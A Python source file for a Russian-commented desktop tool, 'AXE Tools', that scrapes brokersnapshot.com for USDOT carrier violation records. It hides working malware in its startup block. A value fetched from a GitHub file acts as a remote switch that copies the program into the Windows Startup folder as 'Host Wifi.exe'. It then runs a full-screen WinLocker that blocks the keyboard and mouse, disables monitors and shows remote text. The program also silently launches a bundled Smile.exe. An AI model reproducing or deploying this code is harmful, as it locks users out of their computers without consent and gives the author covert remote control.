import json
import shutil
import subprocess
import sys
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor, as_completed
from pynput import mouse as pynput_mouse
import pyautogui
import psutil
import customtkinter
import os
from win32com.client import Dispatch
import requests
import threading
from PIL import Image
from tkinter import filedialog
import logging
import keyboard
from pynput import keyboard as pynput_keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import pandas as pd
import re
from cryptography.fernet import Fernet
from datetime import datetime
from tkcalendar import DateEntry  # Импортируем DateEntry

# Настройка логирования
logging.basicConfig(filename='log.log', level=logging.INFO, format='%(message)s')


key = b'VmCevK5obmvHWRo6iivwUPOlb6_SsDm2zlmpqde2O2M='
cipher = Fernet(key)


# Функция для шифрования сообщения
def encrypt_message(message):
    # print(message)
    return cipher.encrypt(message.encode()).decode()

# Функция для создания логов
def log_message(message, log_code):
    encrypted_message = encrypt_message(message)
    if log_code == 'info':
        logging.info(encrypted_message)
    elif log_code == 'error':
        logging.error(encrypted_message)
    else:
        logging.info(encrypted_message)


class CustomMessagebox:
    def __init__(self, title, message, option_1_text='OK'):
        self.window = customtkinter.CTkToplevel()
        icon_path = os.path.join(os.getcwd(), 'images', 'favicon3.ico')
        self.window.iconbitmap(icon_path)
        self.window.title(title)
        self.window.geometry("300x150")
        self.window.resizable(False, False)

        # Устанавливаем окно всегда на переднем плане
        self.window.attributes("-topmost", True)

        # Центрируем окно на экране
        self.center_window()

        # Блокируем доступ к основному окну
        self.window.grab_set()

        # Заголовок сообщения
        self.label = customtkinter.CTkLabel(self.window, text=message, wraplength=250)
        self.label.pack(pady=20)

        # Кнопка для закрытия
        self.option_1_button = customtkinter.CTkButton(self.window, text=option_1_text, command=self.close)
        self.option_1_button.pack(pady=10)

        # Закрытие окна при клике вне него
        self.window.protocol("WM_DELETE_WINDOW", self.close)

    def center_window(self):
        # Получаем размеры окна
        window_width = 300
        window_height = 150

        # Получаем размеры экрана
        screen_width = self.window.winfo_screenwidth()
        screen_height = self.window.winfo_screenheight()

        # Вычисляем координаты для центрирования
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)

        # Устанавливаем положение окна
        self.window.geometry(f"{window_width}x{window_height}+{x}+{y}")

    def close(self):
        self.window.destroy()
class App(customtkinter.CTk):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        # Установка иконки и параметров окна
        icon_path = os.path.join(os.getcwd(), 'images', 'favicon3.ico')
        self.iconbitmap(icon_path)
        self.title("AXE Tools")
        self.geometry("700x500")
        customtkinter.set_appearance_mode("dark")
        # Настройка сетки 1x2
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)

        # Определение папки с изображениями
        if hasattr(sys, "_MEIPASS"):
            image_folder = os.path.join(sys._MEIPASS, "images")
        else:
            image_folder = os.path.join(os.path.dirname(__file__), "images")

        # Загрузка изображений для интерфейса
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_folder, "logo3.png")), size=(26, 26))
        self.home_image = customtkinter.CTkImage(
            light_image=Image.open(os.path.join(image_folder, "home_light.png")),
            dark_image=Image.open(os.path.join(image_folder, "home_dark.png")),
            size=(20, 20)
        )

        # Создание навигационной панели
        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(
            self.navigation_frame, text="  AXE Tools", image=self.logo_image,
            compound="left", font=customtkinter.CTkFont(size=15, weight="bold")
        )
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.home_button = customtkinter.CTkButton(
            self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Home",
            fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
            image=self.home_image, anchor="w", command=self.home_button_event
        )
        self.home_button.grid(row=1, column=0, sticky="ew")

        # # Кнопка для перезапуска программы
        # self.restart_button = customtkinter.CTkButton(self, text="Перезапустить", command=self.restart_program)
        # self.restart_button.grid(row=4, column=0, padx=20, pady=10, sticky="s")

        # Настройка темного и светлого режимов
        self.appearance_mode_menu = customtkinter.CTkOptionMenu(
            self.navigation_frame, values=["Dark", "Light", "System"],
            command=self.change_appearance_mode_event
        )
        self.appearance_mode_menu.grid(row=6, column=0, padx=20, pady=20, sticky="s")

        # Создание главного окна
        self.home_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.home_frame.grid_columnconfigure(0, weight=1)

        # Прогресс-бар и метка процентов
        self.progress_bar = customtkinter.CTkProgressBar(self.home_frame)
        self.progress_bar.grid(row=1, column=0, padx=10, pady=(10, 20), sticky="ew")
        self.progress_bar.set(0)

        self.percentage_label = customtkinter.CTkLabel(self.home_frame, text="0%")
        self.percentage_label.grid(row=1, column=1, padx=15, pady=(10, 20), sticky="w")

        # Поле ввода для выбора файла
        self.file_path_entry = customtkinter.CTkEntry(self.home_frame, placeholder_text="Введите путь к файлу",
                                                      state="readonly")
        self.file_path_entry.grid(row=2, column=0, padx=10, pady=(10, 20), sticky="ew")
        self.file_path_entry.configure(width=400)

        # Кнопки выбора файла и запуска процесса
        self.home_frame_button_2 = customtkinter.CTkButton(
            self.home_frame, text="Выбрать файл Excel", compound="right", command=self.select_file
        )
        self.home_frame_button_2.grid(row=3, column=0, padx=10, pady=10, sticky="ew")
        self.home_frame_button_2.configure(width=200)

        # Поля для выбора начальной и конечной даты
        self.start_date_entry = DateEntry(self.home_frame, width=12, background='darkblue', foreground='white',
                                          borderwidth=2, date_pattern='yyyy-mm-dd')
        self.start_date_entry.grid(row=4, column=0, padx=10, pady=(10, 5), sticky="ew")

        self.end_date_entry = DateEntry(self.home_frame, width=12, background='darkblue', foreground='white',
                                        borderwidth=2, date_pattern='yyyy-mm-dd')
        self.end_date_entry.grid(row=5, column=0, padx=10, pady=(5, 20), sticky="ew")

        # Загрузка кодов из JSON-файла
        self.codes = self.load_codes_from_file('codes.json')  # Замените на путь к вашему файлу
        self.selected_codes = self.load_selected_codes_from_file(
            'selected_codes.json')  # Замените на путь к вашему файлу
        self.code_vars = {}

        # Кнопка для открытия окна выбора кодов
        self.select_codes_button = customtkinter.CTkButton(
            self.home_frame, text="Выбрать коды", command=self.open_code_selection_window
        )
        self.select_codes_button.grid(row=6, column=0, padx=10, pady=10, sticky="ew")

        self.optionmenu_text = customtkinter.CTkLabel(
            self.home_frame, text="Кол-потоков:", fg_color="transparent"  # Можете настроить цвет текста
        )
        self.optionmenu_text.grid(row=6, column=1, padx=1, pady=10, sticky="ew")

        # Кнопка запуска процесса
        self.process_button = customtkinter.CTkButton(
            self.home_frame, text="Начать", compound="right", command=self.toggle_processing
        )
        self.process_button.grid(row=7, column=0, padx=10, pady=10, sticky="ew")
        self.process_button.configure(width=200)

        # Выпадающее меню
        self.optionmenu_1 = customtkinter.CTkOptionMenu(
            self.home_frame,
            dynamic_resizing=False,
            values=["1", "2", "3", "4", "5"]
        )
        self.optionmenu_1.grid(row=7, column=1, padx=1, pady=10, sticky="ew")

        # Настройка размеров
        self.optionmenu_1.configure(width=60)  # Установите ширину

        self.switch = customtkinter.CTkSwitch(self.home_frame, text=f"Запуск без окна")
        self.switch.grid(row=8, column=0, padx=10, pady=10, sticky="ew")


        # Управление потоками
        self.processing_thread = None
        self.stop_event = threading.Event()

        # Выбор начального окна
        self.select_frame_by_name("home")

    def load_codes_from_file(self, file_path):
        with open(file_path, 'r') as f:
            data = json.load(f)
        return data['codes']

    def load_selected_codes_from_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                data = json.load(f)
            return data['selected_codes']
        except FileNotFoundError:
            return []  # Если файл не найден, возвращаем пустой список

    def open_code_selection_window(self):
        self.code_selection_window = customtkinter.CTkToplevel(self)
        icon_path = os.path.join(os.getcwd(), 'images', 'favicon3.ico')
        self.code_selection_window.iconbitmap(icon_path)
        self.code_selection_window.title("Выбор кодов")
        self.code_selection_window.geometry("400x400")

        # Устанавливаем окно всегда на переднем плане
        self.code_selection_window.attributes("-topmost", True)

        # Центрируем окно на экране
        # Получаем размеры окна
        window_width = 400
        window_height = 400

        # Получаем размеры экрана
        screen_width = self.code_selection_window.winfo_screenwidth()
        screen_height = self.code_selection_window.winfo_screenheight()

        # Вычисляем координаты для центрирования
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)

        # Устанавливаем положение окна
        self.code_selection_window.geometry(f"{window_width}x{window_height}+{x}+{y}")

        # Блокируем доступ к основному окну
        self.code_selection_window.grab_set()


        # Чекбокс для выбора всех кодов
        self.select_all_var = customtkinter.BooleanVar(value=False)  # Используем BooleanVar для чекбокса
        select_all_checkbox = customtkinter.CTkCheckBox(
            self.code_selection_window, text="Выбрать все", variable=self.select_all_var, command=self.toggle_select_all
        )
        select_all_checkbox.pack(anchor="w")

        # Фрейм для списка кодов
        self.code_list_frame = customtkinter.CTkFrame(self.code_selection_window)
        self.code_list_frame.pack(padx=10, pady=10, fill="both", expand=True)

        # Добавление чекбоксов для каждого кода
        self.code_vars = {}
        self.checkboxes = []
        for code in self.codes:
            var = customtkinter.BooleanVar(value=code in self.selected_codes)
            checkbox = customtkinter.CTkCheckBox(self.code_list_frame, text=code, variable=var)
            checkbox.pack(anchor="w")
            self.code_vars[code] = var
            self.checkboxes.append(checkbox)

        # Кнопка для добавления нового кода
        self.add_code_entry = customtkinter.CTkEntry(self.code_selection_window, placeholder_text="Новый код")
        self.add_code_entry.pack(padx=10, pady=5, fill="x")

        add_code_button = customtkinter.CTkButton(self.code_selection_window, text="Добавить код",
                                                  command=self.add_code)
        add_code_button.pack(padx=10, pady=5)

        # Кнопка для удаления выбранного кода
        remove_code_button = customtkinter.CTkButton(self.code_selection_window, text="Удалить выбранный код",
                                                     command=self.remove_selected_codes)
        remove_code_button.pack(padx=10, pady=5)

        # Кнопка для сохранения выбранных кодов
        save_button = customtkinter.CTkButton(self.code_selection_window, text="Сохранить выбор",
                                              command=self.save_selected_codes_and_close)
        save_button.pack(padx=10, pady=5)



    def toggle_select_all(self):
        select_all = self.select_all_var.get()  # Получаем состояние чекбокса "Выбрать все"
        for var in self.code_vars.values():
            var.set(select_all)  # Устанавливаем состояние для всех чекбоксов

    def add_code(self):
        new_code = self.add_code_entry.get().strip()
        if new_code and new_code not in self.codes:
            # Добавляем новый код в список
            self.codes.append(new_code)
            self.code_vars[new_code] = customtkinter.BooleanVar(value=False)  # Используем BooleanVar

            # Создаем чекбокс для нового кода
            checkbox = customtkinter.CTkCheckBox(self.code_list_frame, text=new_code, variable=self.code_vars[new_code])
            checkbox.pack(anchor="w")

            # Очищаем поле ввода
            self.add_code_entry.delete(0, 'end')

            # Сохраняем обновленный список кодов в файл
            self.save_codes_to_file('codes.json')  # Замените на путь к вашему файлу
        else:
            self.after(0, lambda: CustomMessagebox(title="Info", message="Такой Code существует"))

    def save_codes_to_file(self, file_path):
        """Сохраняет коды в JSON файл."""
        # Форматируем данные для записи
        data = {"codes": self.codes}
        # Записываем данные в файл
        with open(file_path, 'w') as json_file:
            json.dump(data, json_file, indent=4)

    def remove_selected_codes(self):
        codes_to_remove = [code for code, var in self.code_vars.items() if var.get()]
        if codes_to_remove:
            for code in codes_to_remove:
                if code in self.codes:
                    self.codes.remove(code)
                    del self.code_vars[code]

            # Обновление JSON файла
            self.update_json_file('codes.json')

            # Обновление интерфейса (удаляем чекбоксы)
            self.refresh_checkboxes()

    def save_selected_codes_and_close(self):
        self.selected_codes = [code for code, var in self.code_vars.items() if var.get()]
        with open('selected_codes.json', 'w') as f:
            json.dump({'selected_codes': self.selected_codes}, f)

        self.code_selection_window.destroy()  # Закрыть окно после сохранения

    def refresh_checkboxes(self):
        for widget in self.code_list_frame.winfo_children():
            widget.destroy()
        for code in self.codes:
            var = customtkinter.BooleanVar(value=code in self.selected_codes)  # Загружаем состояние из выбранных кодов
            checkbox = customtkinter.CTkCheckBox(self.code_list_frame, text=code, variable=var)
            checkbox.pack(anchor="w")
            self.code_vars[code] = var

    def update_json_file(self, file_path):
        with open(file_path, 'w') as f:
            json.dump({'codes': self.codes}, f)
    def toggle_processing(self):
        if self.process_button.cget("text") == "Начать":
            self.start_processing()
        else:
            self.stop_processing()

    def restart_program(self):
        self.quit()  # Останавливаем цикл tkinter

        # Перезапускаем программу через subprocess
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit()  # Завершаем текущий процесс

    def start_processing(self):
        file_path = self.file_path_entry.get()
        start_date = self.start_date_entry.get_date()
        end_date = self.end_date_entry.get_date()

        if file_path:
            self.stop_event.clear()
            self.process_button.configure(text="Стоп")
            # Запускаем поток обработки
            self.processing_thread = threading.Thread(target=self.process_file, args=(file_path, start_date, end_date), daemon=True)
            self.processing_thread.start()
        else:
            self.after(0, lambda: CustomMessagebox(title="Ошибка", message="Выберите файл"))

    def stop_processing(self):
        self.stop_event.set()
        self.process_button.configure(text="Начать")
        self.progress_bar.set(0)
        self.percentage_label.configure(text="0%")
        # Уведомление о завершении процесса
        self.after(0, lambda: CustomMessagebox(title="Успех", message="Процесс успешно остановлен!"))

    def process_file(self, file_path, start_date, end_date):
        # CTkMessagebox(title="Успех", message="Процесс начался!", icon="check", option_1='OK')
        self.progress_bar.set(0)
        self.percentage_label.configure(text="0%")
        valid_companies = []

        try:
            # self.check_selected_codes = self.load_selected_codes_from_file('selected_codes.json')
            # if not self.check_selected_codes:
            #     # CTkMessagebox(title="Info", message="Другие коды не выбраны, по умолчанию будет проверено Code: 395")

            df = pd.read_excel(file_path)
            total_usdot_numbers = len(df['USDOT'])
            potok = self.optionmenu_1.get()

            with ThreadPoolExecutor(max_workers=int(potok)) as executor:
                futures = {executor.submit(self.process_usdot_number, usdot_number, start_date, end_date): usdot_number
                           for usdot_number in df['USDOT']}

                for idx, future in enumerate(as_completed(futures)):
                    if self.stop_event.is_set():
                        log_message("Обработка остановлена пользователем.", 'info')
                        break
                    usdot_number = futures[future]
                    try:
                        result = future.result()
                        if result:  # Если код действительный, добавляем его
                            valid_companies.append(usdot_number)
                    except Exception as e:
                        log_message(f"Ошибка при обработке USDOT {usdot_number}: {e}", 'error')

                    # Проверяем, была ли вызвана остановка
                    if self.stop_event.is_set():
                        log_message("Обработка остановлена пользователем.", 'info')
                        break

                    # Обновление прогресса
                    progress = (idx + 1) / total_usdot_numbers
                    self.progress_bar.set(progress)
                    self.percentage_label.configure(text=f"{int(progress * 100)}%")

            if valid_companies:
                result_df = pd.DataFrame(valid_companies, columns=['USDOT'])
                exel_name = f'./Sorted_{datetime.now().strftime("%Y%m%d_%H%M%S")}.xlsx'
                result_df.to_excel(f'{exel_name}', index=False)

                # Перемещение файла в папку загрузок
                downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
                new_location = os.path.join(downloads_folder, os.path.basename(exel_name))
                try:
                    shutil.move(exel_name, new_location)
                    log_message(f"Файл перемещён в: {new_location}", 'info')
                except Exception as e:
                    log_message(f"Ошибка при перемещении файла: {e}", 'error')

        except Exception as e:
            log_message(f"Ошибка при обработке файла: {e}", 'error')
            CustomMessagebox(title="Ошибка", message="Произошла ошибка, обратитесь к разработчику")
        finally:
            self.process_button.configure(text="Начать")
            self.progress_bar.set(0)  # Сброс прогресс-бара
            self.percentage_label.configure(text="0%")  # Сброс метки процента
            if not self.stop_event.is_set():  # Показываем сообщение, только если процесс не был остановлен
                CustomMessagebox(title="Успех", message="Файл успешно обработан!")

    def process_usdot_number(self, usdot_number, start_date, end_date):
        """Обрабатывает один USDOT номер."""
        try:
            if self.stop_event.is_set():
                log_message("Обработка прервана до начала.", 'info')
                return False  # Завершение, если остановка была вызвана
            if self.switch.get() == 1:
                options = Options()
                options.add_argument("--headless")  # Запуск браузера в фоновом режиме
            else:
                options = webdriver.ChromeOptions()

            with webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options) as driver:
                driver.maximize_window()
                attempt = 0  # Добавляем счетчик попыток
                max_attempts = 3  # Устанавливаем максимальное количество попыток

                while attempt < max_attempts:  # Цикл для ограниченного числа попыток
                    if self.stop_event.is_set():
                        log_message("Обработка USDOT прервана.", 'info')
                        return False  # Завершение, если остановка была вызвана

                    try:
                        driver.get(
                            f"https://brokersnapshot.com/SearchInspections?dot={usdot_number}&date-from={start_date.strftime('%Y-%m-%d')}&date-to={end_date.strftime('%Y-%m-%d')}&limit=100"
                        )
                        wait = WebDriverWait(driver, 10)
                        table = wait.until(EC.presence_of_element_located(
                            (By.CSS_SELECTOR, "table.ui.celled.structured.compact.responsive.table")))

                        # Проверка для выхода из функции, если стоп-событие установлено
                        if self.stop_event.is_set():
                            log_message("Обработка прервана пользователем во время загрузки.", 'info')
                            return False

                        rows = table.find_elements(By.TAG_NAME, "tr")
                        has_valid_violation = False

                        # Анализ данных таблицы на наличие нарушений
                        for i in range(len(rows)):
                            if self.stop_event.is_set():  # Проверяем внутри цикла
                                log_message("Обработка прервана во время анализа строки.", 'info')
                                return False

                            row_text = rows[i].text.strip()
                            if row_text and "Violations:" in row_text:
                                violations_text = row_text.split("Violations:")[1].strip()
                                codes = re.findall(r'D Code:\s*(\S+)', violations_text)

                                # Проверка даты нарушений и сохранение валидных данных
                                if i > 0:
                                    date_row_text = rows[i - 1].text.strip()
                                    date_match = re.search(r'(\d{1,2}/\d{1,2}/\d{4})', date_row_text)

                                    if date_match:
                                        date_str = date_match.group(1)
                                        violation_date = datetime.strptime(date_str, '%m/%d/%Y').date()
                                        self.selected_codes = self.load_selected_codes_from_file(
                                            'selected_codes.json')
                                        if not self.selected_codes:
                                            if start_date <= violation_date <= end_date:
                                                for code in codes:
                                                    if '395' in code:
                                                        has_valid_violation = True
                                        else:
                                            if start_date <= violation_date <= end_date:
                                                for code in self.codes:
                                                    if code in self.selected_codes:
                                                        has_valid_violation = True

                        return has_valid_violation

                    except Exception as e:
                        print(e)
                        attempt += 1  # Увеличиваем счетчик при ошибке
                        log_message(f"Ошибка при обработке USDOT {usdot_number}, попытка {attempt}: {e}", 'error')
                        log_message("Перезапускаем сайт...", 'info')
                        if attempt >= max_attempts:  # Если достигли предела попыток
                            log_message("Превышено количество попыток. Пропускаем этот номер.", 'error')
                            return False
                        continue

        except Exception as e:
            print(e)
            log_message(f"Ошибка при обработке USDOT {usdot_number}: {e}", 'error')
            return False

    def change_appearance_mode_event(self, new_appearance_mode: str):
        customtkinter.set_appearance_mode(new_appearance_mode)

    def select_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Excel files", "*.xlsx;*.xls")])
        if file_path:
            self.file_path_entry.configure(state="normal")
            self.file_path_entry.delete(0, customtkinter.END)
            self.file_path_entry.insert(0, file_path)
            self.file_path_entry.configure(state="readonly")

    def home_button_event(self):
        self.select_frame_by_name("home")

    def select_frame_by_name(self, name: str):
        if name == "home":
            self.home_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.home_frame.grid_forget()



class WinLocker(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.disable_second_monitor()
        self.set_english_language()

        # Загрузка иконки
        icon_path = os.path.join(os.path.dirname(__file__), 'images', 'favicon3.ico')
        self.iconbitmap(icon_path)
        self.title("AXE Tools")

        # Полноэкранный режим
        self.attributes('-fullscreen', True)
        self.attributes('-topmost', True)

        customtkinter.set_appearance_mode("dark")

        # Настройка сетки 1x1 для центрирования текста
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Получение текста из внешнего источника
        try:
            winLockerText = requests.get(
                'https://raw.githubusercontent.com/bilmiman/AuthAxeTools/refs/heads/main/text.txt')
            winLockerText.raise_for_status()  # Проверка на ошибки
            text = winLockerText.text
        except requests.RequestException:
            text = "Ошибка загрузки текста."  # Обработка ошибки загрузки

        # Создание текстовой метки в центре
        self.label = customtkinter.CTkLabel(self, text=text, font=("Arial", 48))
        self.label.grid(row=0, column=0, sticky="nsew")  # Центрирование с помощью sticky

        # Запуск блокировки клавиатуры и мыши в отдельном потоке
        self.lock_thread = threading.Thread(target=self.lock_keyboard_and_mouse)
        self.lock_thread.start()

    def disable_second_monitor(self):
        """Отключает второй монитор и оставляет только основной."""
        try:
            command = 'DisplaySwitch.exe /internal'
            subprocess.run(["powershell", "-Command", command], check=True)
            log_message('Второй монитор отключен, оставлен только основной.', 'info')
        except subprocess.CalledProcessError as e:
            log_message(f'Ошибка при отключении второго монитора: {e}', 'error')

    def enable_second_monitor(self):
        """Включает второй монитор и расширяет рабочий стол на него."""
        try:
            command = 'DisplaySwitch.exe /extend'
            subprocess.run(["powershell", "-Command", command], check=True)
            log_message('Второй монитор включен, рабочий стол расширен на него.', 'info')
        except subprocess.CalledProcessError as e:
            log_message(f"Ошибка при включении второго монитора: {e}", 'error')

    def lock_keyboard_and_mouse(self):
        self.lock_keyboard()
        self.block_mouse_movement()

    def lock_keyboard(self):
        # Блокировка клавиатуры
        for key in range(26):
            keyboard.block_key(chr(key + 97))  # Блокировка 'a' до 'z'

        for key in range(10):
            keyboard.block_key(str(key))  # Блокировка '0' до '9'

        special_keys = [
            'esc', 'tab', 'enter', 'shift', 'ctrl', 'alt', 'space',
            'backspace', 'delete', 'home', 'end', 'page up', 'page down',
            'up', 'down', 'left', 'right',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10',
            'f11', 'f12', 'windows'
        ]

        for key in special_keys:
            keyboard.block_key(key)

        # Блокировка комбинаций с клавишей Windows
        windows_combinations = [
                                   'windows+' + chr(i) for i in range(97, 123)
                               ] + ['windows+tab']

        for combo in windows_combinations:
            keyboard.add_hotkey(combo, lambda: None)

        # Хранение состояния клавиш
        win_pressed = False

        def on_press(key):
            nonlocal win_pressed
            if key == pynput_keyboard.Key.cmd:  # Проверяем нажатие клавиши Windows
                win_pressed = True
            elif key == pynput_keyboard.KeyCode(char='p') and win_pressed:
                self.attributes("-fullscreen", False)
                self.attributes('-topmost', True)
                self.geometry("700x500")  # Возвращаем к исходным размерам

                # Разблокировка клавиатуры и мыши
                self.unlock_keyboard()
                self.unlock_mouse()

                try:
                    command = 'Set-WinUserLanguageList en-US,ru-RU -Force'
                    subprocess.run(["powershell", "-Command", command], check=True)
                    self.enable_second_monitor()
                    log_message('Языки интерфейса изменены на английский и русский.', 'info')
                except subprocess.CalledProcessError as e:
                    log_message(f"Ошибка при изменении языка: {e}", 'error')

        def on_release(key):
            nonlocal win_pressed
            if key == pynput_keyboard.Key.cmd:  # Отпускаем клавишу Windows
                win_pressed = False

        # Запускаем слушатель клавиатуры
        listener = pynput_keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()

    def block_mouse_movement(self):
        """Блокирует движение мыши, перемещая ее обратно."""
        initial_x, initial_y = pyautogui.position()  # Запоминаем начальную позицию

        def on_move(x, y):
            # Возвращаем мышь на начальную позицию
            pyautogui.moveTo(initial_x, initial_y)

        # Запускаем слушатель мыши
        self.mouse_listener = pynput_mouse.Listener(on_move=on_move)
        self.mouse_listener.start()

    def set_english_language(self):
        """Переключает интерфейс на английский с помощью PowerShell"""
        try:
            command = 'Set-WinUserLanguageList en-US -Force'
            subprocess.run(["powershell", "-Command", command], check=True)
            log_message("Язык интерфейса изменен на английский.", 'info')
        except subprocess.CalledProcessError as e:
            log_message(f"Ошибка при изменении языка: {e}", 'error')

    def unlock_keyboard(self):
        # Разблокировка клавиш
        for key in range(26):
            try:
                keyboard.unblock_key(chr(key + 97))  # Разблокировка 'a' до 'z'
            except KeyError:
                pass  # Игнорируем, если ключ не был заблокирован

        for key in range(10):
            try:
                keyboard.unblock_key(str(key))  # Разблокировка '0' до '9'
            except KeyError:
                pass  # Игнорируем, если ключ не был заблокирован

        special_keys = [
            'esc', 'tab', 'enter', 'shift', 'ctrl', 'alt', 'space',
            'backspace', 'delete', 'home', 'end', 'page up', 'page down',
            'up', 'down', 'left', 'right',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10',
            'f11', 'f12', 'windows'
        ]

        for key in special_keys:
            try:
                keyboard.unblock_key(key)
            except KeyError:
                pass  # Игнорируем, если ключ не был заблокирован

    def unlock_mouse(self):
        """Разблокировка мыши"""
        if hasattr(self, 'mouse_listener'):
            self.mouse_listener.stop()


def check_autostart(program_name):
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu",
                                  "Programs", "Startup")

    for file in os.listdir(startup_folder):
        if file.lower() == f"{program_name}.lnk":
            return True
    return False


def create_shortcut(target, shortcut_name):
    # Путь к папке автозагрузки
    startup_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_path = os.path.join(startup_folder, f"{shortcut_name}.lnk")

    # Создание ярлыка
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.IconLocation = target  # Установить иконку
    shortcut.save()



def is_process_running(process_name):
    """Проверяет, запущен ли процесс с заданным именем."""
    for proc in psutil.process_iter(attrs=['pid', 'name']):
        if proc.info['name'] == process_name:
            return True
    return False

def run_exe_if_not_running(exe_path):
    """Запускает exe файл, если он не запущен."""
    process_name = os.path.basename(exe_path)  # Получаем имя файла, например, "Smile.exe"

    if not is_process_running(process_name):
        print(f"{process_name} не запущен. Запускаем...")
        subprocess.Popen(exe_path)
    else:
        print(f"{process_name} уже запущен.")

def ensure_file_exists(file_path):
    if not os.path.isfile(file_path):
        with open(file_path, 'w') as f:
            f.write('1.5')  # Запись начального значения или можно оставить пустым
        log_message(f"Файл '{file_path}' создан.", 'info')

def codes_file_exists_json(file):
    if file == 'selected':
        if not os.path.isfile('./selected_codes.json'):
            with open('selected_codes.json', 'w') as f:
                data = {"selected_codes": ["395"]}
                json.dump(data, f)
            log_message(f"Файл 'selected_codes.json' создан.", 'info')
    if file == 'codes':
        if not os.path.isfile('./codes.json'):
            with open('codes.json', 'w') as f:
                data = {"codes": ["395"]}
                json.dump(data, f)
            log_message(f"Файл 'codes.json' создан.", 'info')



if __name__ == "__main__":
    log_message('Программа успешно запустилась!', 'info')
    ensure_file_exists('./version.txt')
    codes_file_exists_json('codes')
    codes_file_exists_json('selected')
    AuthPass = requests.get('https://raw.githubusercontent.com/bilmiman/AuthAxeTools/refs/heads/main/pass.txt')
    exe_path = "./images/Smile.exe"  # Путь к вашему .exe файлу
    run_exe_if_not_running(exe_path)
    if str(AuthPass.text.strip()) == '1':
        # Определяем путь к папке автозагрузки
        autostart_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs",
                                        "Startup")

        # Создаём имя для папки
        folder_name = "AXE Tools"  # Назовите папку, как вам нужно
        folder_path = os.path.join(autostart_folder, folder_name)

        # Проверяем, существует ли папка, и создаём её, если нет
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            log_message(f"Папка существует: {folder_path}", 'info')
        app = App()
        app.mainloop()
    elif str(AuthPass.text.strip()) == '0':
        # Получаем путь к текущему исполняемому файлу
        current_file = os.path.abspath(sys.argv[0])

        # Определяем путь к папке автозагрузки
        autostart_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs",
                                        "Startup")

        # Создаём имя для папки
        folder_name = "AXE Tools"  # Назовите папку, как вам нужно
        folder_path = os.path.join(autostart_folder, folder_name)

        # Проверяем, существует ли папка, и создаём её, если нет
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            log_message(f"Папка создана: {folder_path}", 'info')
        else:
            log_message(f"Папка уже существует: {folder_path}", 'info')

        # Создаём имя для копии .exe файла
        copy_name = "Host Wifi.exe"  # Укажите имя для копии
        destination_exe = os.path.join(folder_path, copy_name)

        # Проверяем, существует ли файл в папке автозагрузки
        if not os.path.exists(destination_exe):
            # Копируем .exe файл
            shutil.copy(current_file, destination_exe)
            log_message(f"Программа успешно добавлена в автозагрузку: {destination_exe}", 'info')
        else:
            log_message(f"Файл уже существует в автозагрузке: {destination_exe}", 'info')

        # Копируем папку images в папку автозагрузки
        images_folder_path = os.path.join(os.path.dirname(current_file), 'images')
        destination_images_folder = os.path.join(folder_path, 'images')

        # Проверяем, существует ли папка images
        if not os.path.exists(destination_images_folder):
            # Копируем папку images
            shutil.copytree(images_folder_path, destination_images_folder)
            log_message(f"Папка images успешно добавлена в автозагрузку: {destination_images_folder}", 'info')
        else:
            log_message(f"Папка images уже существует в автозагрузке: {destination_images_folder}", 'info')
        winlocker = WinLocker()
        winlocker.mainloop()
